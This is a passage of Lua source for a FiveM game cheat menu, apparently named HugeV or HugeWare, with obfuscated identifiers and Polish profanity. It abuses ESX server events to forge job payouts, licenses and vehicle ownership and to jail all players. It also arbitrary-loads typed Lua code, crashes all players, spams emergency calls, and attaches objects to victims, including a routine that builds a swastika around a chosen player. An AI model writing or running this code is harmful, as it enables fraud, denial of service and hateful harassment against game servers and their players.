            local weapon_disygo9dfuigdsf =
                KeyBoardInput_jdhgijslrgeg("Type name of weapon e.g WEAPON_PISTOL", "WEAPON_", 100)
            if weapon_disygo9dfuigdsf ~= nil then
                Czitirzen_InvokeNative(
                    0xBF0FD6E56C964FCB,
                    Czitirzen_InvokeNative(0xD80958FC74E988A6),
                    Czitirzen_InvokeNative(0xD24D37CC275948CC, string.upper(weapon_disygo9dfuigdsf)),
                    1000,
                    false,
                    false
                )
            end
        end
        if SlimButton_antekr5("Remove Custom Weapon", false, 0.35, 0.41) then
            local weapon_disygo9dfuigdsf =
                KeyBoardInput_jdhgijslrgeg("Type name of weapon, e.g. WEAPON_PISTOL", "WEAPON_", 100)
            if weapon_disygo9dfuigdsf ~= nil then
                Czitirzen_InvokeNative(
                    0x4899CB088EDF59B8,
                    Czitirzen_InvokeNative(0xD80958FC74E988A6),
                    Czitirzen_InvokeNative(0xD24D37CC275948CC, string.upper(weapon_disygo9dfuigdsf))
                )
            end
        end

        -- DODAWANIA CUSTOMIZACJI

        if SlimButton_antekr5("Add Special Finish", false, 0.58, 0.27) then
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x27872C90)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xD7391086)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x9B76C72C)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x487AAE09)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x85A64DF9)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x377CD377)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xD89B9658)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x4EAD7533)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x4032B5E7)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x77B8AB2F)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x7A6A7B7B)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x161E9241)
        end
        if SlimButton_antekr5("Add Extended Clip", false, 0.58, 0.29) then
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x249A17D5)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x64F9C62B)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x7B0033B3)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x7C8BD10E)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x86BD7F72)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x8EC1C979)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xB3688B0F)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xD6C59CD6)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xED265A1C)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xD67B4F2D)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xD9D3AC92)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x33BA12E8)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x10E6BA2B)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x350966FB)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xBB46E417)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x334A5203)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x82158B47)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xEAC8C270)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xB1214F9B)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x91109691)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xCCFD2AC5)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x971CF6FD)
        end
        if SlimButton_antekr5("Add Flashlight", false, 0.58, 0.31) then
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x359B7AAE)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x7BC4CDDC)
        end
        if SlimButton_antekr5("Add Grip", false, 0.58, 0.33) then
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xC164F53)
        end
        if SlimButton_antekr5("Add Suppresor", false, 0.58, 0.35) then
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x65EA7EBB)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x837445AA)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xA73D4664)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xC304849A)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xE608B35E)
        end
        if SlimButton_antekr5("Add Scope", false, 0.58, 0.37) then
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x9D2FBF29)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xA0D89C42)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xAA2C45B4)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0xD2443DDC)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x3CC6BA57)
            AddCustomization_HugeV_DSIUHGIUDSGSD(0x3C00AFED)
        end

        -- USUWANIE CUSTOMIZACJI
        if SlimButton_antekr5("Remove Special Finish", false, 0.66, 0.27) then
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x27872C90)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD7391086)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x9B76C72C)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x487AAE09)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x85A64DF9)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x377CD377)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD89B9658)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x4EAD7533)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x4032B5E7)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x77B8AB2F)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7A6A7B7B)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x161E9241)
        end
        if SlimButton_antekr5("Remove Extended Clip", false, 0.66, 0.29) then
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x249A17D5)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x64F9C62B)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7B0033B3)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7C8BD10E)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x86BD7F72)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x8EC1C979)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xB3688B0F)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD6C59CD6)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xED265A1C)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD67B4F2D)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD9D3AC92)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x33BA12E8)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x10E6BA2B)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x350966FB)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xBB46E417)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x334A5203)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x82158B47)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xEAC8C270)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xB1214F9B)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x91109691)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xCCFD2AC5)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x971CF6FD)
        end
        if SlimButton_antekr5("Remove Flashlight", false, 0.66, 0.31) then
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x359B7AAE)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7BC4CDDC)
        end
        if SlimButton_antekr5("Remove Grip", false, 0.66, 0.33) then
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xC164F53)
        end
        if SlimButton_antekr5("Remove Suppresor", false, 0.66, 0.35) then
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x65EA7EBB)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x837445AA)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xA73D4664)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xC304849A)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xE608B35E)
        end
        if SlimButton_antekr5("Remove Scope", false, 0.66, 0.37) then
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x9D2FBF29)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xA0D89C42)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xAA2C45B4)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD2443DDC)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x3CC6BA57)
            RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x3C00AFED)
        end
    elseif HugeV.locals.current_tab == "Misc" then
        --[[if MoneyMaker_Kurwo then
		print("XD")
		end]]
        if SlimCheckbox("Safe Mode", 0.36, 0.27, 0.27, HugeV.locals.Safemode) then
            HugeV.locals.Safemode = not HugeV.locals.Safemode
        end

        if SlimCheckbox("Anti Anti Afk", 0.36, 0.29, 0.29, HugeV.locals.AntiAntiAfk) then
            HugeV.locals.AntiAntiAfk = not HugeV.locals.AntiAntiAfk
        end

        if SlimCheckbox("Disable collision", 0.36, 0.31, 0.31, HugeV.locals.disable_collisions) then
            HugeV.locals.disable_collisions = not HugeV.locals.disable_collisions
        end

        if SlimButton_antekr5("Run Lua Code", false, 0.35, 0.33) then
            local code_to_execute_diushdgiosg = KeyBoardInput_jdhgijslrgeg("Type code to execute", "", 99999999)
            local code_to_pcall_dihsgiuhfgisldugdf = load(code_to_execute_diushdgiosg)
            pcall(code_to_pcall_dihsgiuhfgisldugdf)
            DebugPrint("~g~Code was ~g~Successfully Executed!:  ~s~" .. code_to_execute_diushdgiosg, "SUCCES")
        end
    elseif HugeV.locals.current_tab == "Lua" then
        if SlimCheckbox("Money Maker ~g~ESX", 0.36, 0.27, 0.27, MoneyMaker_Kurwo) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                MoneyMaker_Kurwo = not MoneyMaker_Kurwo
            end
        end
        if SlimButton_antekr5("Steal Vehicle ~g~ESX", false, 0.35, 0.29) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                if IsPedInAnyVehicle(HugeV.Player.PedId) then
                    local HRTTTYYNYYNFYYYYYYYY = GetVehiclePedIsIn(HugeV.Player.PedId, 0.0)
                    local RVHVYHRRVYHRHVYVYH = GetVehicleProperties(GetVehiclePedIsIn(HugeV.Player.PedId, false))
                    local GTTRTRGRDFSRGTHR = RVHVYHRRVYHRHVYVYH.model
                    local GKERuf8rufa8F84TH4 = GetDisplayNameFromVehicleModel(GTTRTRGRDFSRGTHR)
                    TriggerServerEvent(
                        true,
                        "esx_vehicleshop:setVehicleOwnedPlayerId",
                        GetPlayerServerId(HugeV.Player.LocalId),
                        uFHeL,
                        GKERuf8rufa8F84TH4,
                        GTTRTRGRDFSRGTHR,
                        false
                    )
                end
            end
        end
        if SlimButton_antekr5("esx qalle jail ~g~ESX", false, 0.35, 0.31) then
            for HugeVOnTop = 0, 128 do
                TriggerServerEvent(
                    "esx-qalle-jail:jailPlayer",
                    GetPlayerServerId(HugeVOnTop),
                    438653987345,
                    "HugeWare - The Best FiveM Menu!, https://discord.gg/a3nGNjM"
                )
            end
        end
        if SlimButton_antekr5("esx dmvschool addLicense ~g~ESX", false, 0.35, 0.33) then
            TriggerServerEvent("dmv:success")
            TriggerServerEvent("esx_dmvschool:addLicense", "dmv")
            TriggerServerEvent("esx_dmvschool:addLicense", "drive")
            TriggerServerEvent("esx_dmvschool:addLicense", "drive_bike")
            TriggerServerEvent("esx_dmvschool:addLicense", "drive_truck")
            TriggerServerEvent("esx_airlines:addLicense", "helico")
            TriggerServerEvent("esx_airlines:addLicense", "avion")
            TriggerServerEvent("esx_weashopjob:addLicense", "drive_bike")
            TriggerServerEvent("esx_weashopjob:addLicense", "drive_truck")
        end
        if SlimButton_antekr5("esx garbagejob ~g~ESX", false, 0.35, 0.35) then
            TriggerServerEvent("esx_garbagejob:pay", 100000)
        end

        if SlimButton_antekr5("esx vangelico robbery ~g~ESX", false, 0.35, 0.37) then
            TriggerServerEvent("esx_vangelico_robbery:gioielli")
            TriggerServerEvent("lester:vendita")
        end

        if SlimButton_antekr5("tostzdrapka ~g~ESX", false, 0.35, 0.39) then
            TriggerServerEvent("tostzdrapka:wygranko")
            TriggerServerEvent("tostzdrapka:wygranko1")
            TriggerServerEvent("tostzdrapka:wygrankopremium")
        end
        if SlimButton_antekr5("esx jailer sendToJail ~g~ESX", false, 0.35, 0.41) then
            for HugeVJGIREJIO = 0, 128 do
                TriggerServerEvent(
                    "esx_jailer:sendToJail",
                    GetPlayerServerId(PETLATYKURWOZONETAPAJEBANA),
                    10000000 * 60,
                    "HugeWare - The Best FiveM Menu!, https://discord.gg/a3nGNjM",
                    999999999999999999
                )
            end
        end
        if SlimButton_antekr5("esx yacht reward ~g~ESX", false, 0.35, 0.43) then
            TriggerServerEvent("esx_yacht:reward")
        end
        if SlimButton_antekr5("speedy pizzajob pay ~g~ESX", false, 0.35, 0.45) then
            TriggerServerEvent("speedy_pizzajob:pay")
        end

        if SlimButton_antekr5("esx taxijob success ~g~ESX", false, 0.35, 0.47) then
            TriggerServerEvent("esx_taxijob:success")
        end
        if SlimButton_antekr5("wojtek kurier ~g~ESX", false, 0.35, 0.49) then
            TriggerServerEvent("wojtek_kurier:hajszanormalna")
        end
        if SlimButton_antekr5("esx joblistingg setJob ~g~ESX", false, 0.35, 0.51) then
            local costamxd_autorskafunckja =
                KeyBoardInput_jdhgijslrgeg("Input a job name (ex. police, taxi etc)", "", 100000)
            TriggerServerEvent("esx_joblistingg:setJob", tonumber(costamxd_autorskafunckja))
        end
        if SlimButton_antekr5("Community Service All ~g~ESX", false, 0.35, 0.53) then
            CommunityService_1_HUGEV()
        end
    elseif HugeV.locals.current_tab == "Destroyer" then
        if SlimCheckbox("CRASH ALL PLAYERS LOOP", 0.36, 0.27, 0.27, Spawn_In_Veh_UHUDGFDGDF) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                Spawn_In_Veh_UHUDGFDGDF = not Spawn_In_Veh_UHUDGFDGDF -- bedziemy tutaj jakąś fajną funkcje dodawać haha
            end
        end

        if SlimButton_antekr5("FIB ALL CARS", false, 0.35, 0.29) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                local _veh = IsPedInAnyVehicle and GetVehiclePedIsIn(HugeV.Player.PedId)

                CreateThread(
                    function()
                        for vehicle in EnumerateVehicles() do
                            if vehicle ~= _veh then
                                local building = CreateObject(-1404869155, 0, 0, 0, true, true, true)
                                DoNet_SDUHGSDIUSUDGYSUDIGSDG(ramp)
                                NetworkRequestControlOfEntity(vehicle)
                                RequestControlOnce_chuj_dupa_cipa(vehicle)
                                RequestControlOnce_chuj_dupa_cipa(building)

                                if DoesEntityExist(vehicle) then
                                    AttachEntityToEntity(
                                        building,
                                        vehicle,
                                        0,
                                        0,
                                        -1.0,
                                        0.0,
                                        0.0,
                                        0,
                                        true,
                                        true,
                                        false,
                                        true,
                                        1,
                                        true
                                    )
                                end
                            end

                            Wait(50)
                        end
                    end
                )
            end
        end
        if SlimButton_antekr5("SANTOS CITY ALL MAP", false, 0.35, 0.31) then
            if HugeV.locals.Safemode then
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                local _veh = IsPedInAnyVehicle and GetVehiclePedIsIn(HugeV.Player.PedId)

                CreateThread(
                    function()
                        for vehicle in EnumerateVehicles() do
                            if vehicle ~= _veh then
                                local building = CreateObject(GetHashKey("cs4_lod_01_slod3"), 0, 0, 0, true, true, true)
                                DoNet_SDUHGSDIUSUDGYSUDIGSDG(ramp)
                                NetworkRequestControlOfEntity(vehicle)
                                RequestControlOnce_chuj_dupa_cipa(vehicle)
                                RequestControlOnce_chuj_dupa_cipa(building)

                                if DoesEntityExist(vehicle) then
                                    AttachEntityToEntity(
                                        building,
                                        vehicle,
                                        0,
                                        0,
                                        -1.0,
                                        0.0,
                                        0.0,
                                        0,
                                        true,
                                        true,
                                        false,
                                        true,
                                        1,
                                        true
                                    )
                                end
                            end

                            Wait(50)
                        end
                    end
                )
            end
        end
        if SlimButton_antekr5("CHILIAD CITY ALL MAP", false, 0.35, 0.33) then
            if HugeV.locals.Safemode then
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                local _veh = IsPedInAnyVehicle and GetVehiclePedIsIn(HugeV.Player.PedId)

                CreateThread(
                    function()
                        for vehicle in EnumerateVehicles() do
                            if vehicle ~= _veh then
                                local building =
                                    CreateObject(GetHashKey("cs1_lod3_terrain_slod3_01"), 0, 0, 0, true, true, true)
                                DoNet_SDUHGSDIUSUDGYSUDIGSDG(ramp)
                                NetworkRequestControlOfEntity(vehicle)
                                RequestControlOnce_chuj_dupa_cipa(vehicle)
                                RequestControlOnce_chuj_dupa_cipa(building)

                                if DoesEntityExist(vehicle) then
                                    AttachEntityToEntity(
                                        building,
                                        vehicle,
                                        0,
                                        0,
                                        -1.0,
                                        0.0,
                                        0.0,
                                        0,
                                        true,
                                        true,
                                        false,
                                        true,
                                        1,
                                        true
                                    )
                                end
                            end

                            Wait(50)
                        end
                    end
                )
            end
        end
        if SlimButton_antekr5("PIGGY BACK ALL ~g~ESX", false, 0.35, 0.35) then
            Citizen.CreateThread(
                function()
                    local HTRYHY5BU76B7U4 = "anim@arena@celeb@flat@paired@no_props@"
                    local VRTHRTH5U56 = "piggyback_c_player_a"
                    local GVTRHRBRJYTJ = "piggyback_c_player_b"
                    local BTRDTRVHTRJYJNTY = -0.07
                    local VTRDBTRVVVVVVVVVVVVVVVV = 0.0
                    local VERVSREGREHTRJYTJYTRJ = 0.45
                    local VTRVHYJTRJVYTYTJTY = 0.0
                    local VRTHTYHTYJYTJUKUYKUJRTY = 100000
                    local VYEVJJVYJYJYVETYTRJJTR = 49
                    local VRDBTRBRTYJYTJTYKTYR656HTDRHTR = 33
                    local VRTBTRHRTNRTNYT = 1
                    for _, PETLATYKURWOZONETAPAJEBANA in ipairs(GetActivePlayers()) do
                        if PETLATYKURWOZONETAPAJEBANA ~= HugeV.Player.LocalId then
                            TriggerServerEvent(
                                "cmg2_animations:sync",
                                PETLATYKURWOZONETAPAJEBANA,
                                HTRYHY5BU76B7U4,
                                VRTHRTH5U56,
                                GVTRHRBRJYTJ,
                                BTRDTRVHTRJYJNTY,
                                VTRDBTRVVVVVVVVVVVVVVVV,
                                VERVSREGREHTRJYTJYTRJ,
                                GetPlayerServerId(PETLATYKURWOZONETAPAJEBANA),
                                VRTHTYHTYJYTJUKUYKUJRTY,
                                VTRVHYJTRJVYTYTJTY,
                                VYEVJJVYJYJYVETYTRJJTR,
                                VRDBTRBRTYJYTJTYKTYR656HTDRHTR,
                                VRTBTRHRTNRTNYT
                            )
                            Citizen.Wait(10)
                        end
                    end
                end
            )
        end
        if SlimButton_antekr5("Spam Mechanic ~g~ESX", false, 0.35, 0.37) then
            for i = 0.0, 250 do
                local P4cE = GetEntityCoords(GetPlayerPed(i))
                TriggerServerEvent("esx_addons_gcphone:startCall", "mecano", "ouch!", P4cE)
            end
            for i = 0.0, 250 do
                local u7rORT = GetEntityCoords(GetPlayerPed(i))
                TriggerServerEvent("esx_addons_gcphone:startCall", "mechanic", "ouch!", u7rORT)
            end
        end
        if SlimButton_antekr5("Spam Police ~g~ESX", false, 0.35, 0.39) then
            for i = 0.0, 250 do
                local XvY = GetEntityCoords(GetPlayerPed(i))
                TriggerServerEvent("esx_addons_gcphone:startCall", "police", "ouch!", XvY)
            end
        end
        if SlimButton_antekr5("Spam Police ~g~ESX ~r~Other Method", false, 0.35, 0.41) then
            Police_SPAM_JJTYJTJYTJ()
        end
        if SlimButton_antekr5("Spam Ambulance ~g~ESX", false, 0.35, 0.43) then
            for i = 0.0, 250 do
                local hrtht = GetEntityCoords(GetPlayerPed(i))
                TriggerServerEvent("esx_addons_gcphone:startCall", "ambulance", "ouch!", hrtht)
            end
        end
        if SlimButton_antekr5("Interact Sound Crasher ~g~ESX", false, 0.35, 0.45) then
            EarRape_InteractSoud_BGUTRBHUTRHNKRTUJH()
        end
        if SlimButton_antekr5("Swastika All", false, 0.35, 0.47) then
            local swastikalocals = {
                container1 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container2 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container3 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container4 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container5 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container6 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container7 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container8 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container9 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container10 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container11 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container12 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container13 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container14 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container15 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container16 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container17 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container19 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container20 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container21 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container22 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container23 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container24 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container25 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                container26 = CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true)
            }
            --                                      BOTTOM LEFT L
            AttachEntityToEntity(
                container1,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                0,
                0,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container2,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -3.2,
                90,
                0,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container3,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                90,
                0,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container4,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                0,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container5,
                Czitirzen_InvokeNative(0x6E31E993, SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                5.6,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container6,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                2.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            --                                      TOP RIGHT L
            AttachEntityToEntity(
                container7,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                11.2,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(20)
            AttachEntityToEntity(
                container8,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                14,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container9,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                6.4,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container10,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                9.6,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container11,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container12,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            --                                      MIDDLE LEFT UP
            Citizen.Wait(50)
            AttachEntityToEntity(
                container13,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                0,
                8.4,
                0,
                90,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container14,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -3.2,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container15,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(20)
            AttachEntityToEntity(
                container16,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                11.2,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container17,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                14,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(20)
            AttachEntityToEntity(
                container18,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            --                                      MIDDLE RIGHT DOWN
            Citizen.Wait(50)
            AttachEntityToEntity(
                container19,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                6.4,
                8.4,
                0,
                90,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container20,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                9.6,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                container21,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                container22,
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                5.6,
